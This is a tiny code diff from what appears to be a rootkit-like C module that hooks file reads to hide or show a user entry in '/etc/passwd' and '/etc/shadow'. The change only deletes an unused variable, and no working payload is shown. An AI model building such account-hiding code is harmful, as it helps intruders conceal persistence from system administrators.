@@ -3,7 +3,6 @@
 /* hide/show a user in "/etc/passwd" and "/etc/shadow" */
 
 static enum file_content_hide erase = NONE;
-static int erased;
 static int fugitive__hidden = 0;
 static struct sctm_hook fugitive__hooks[3];
 static char *fugitive__lines[2] = {
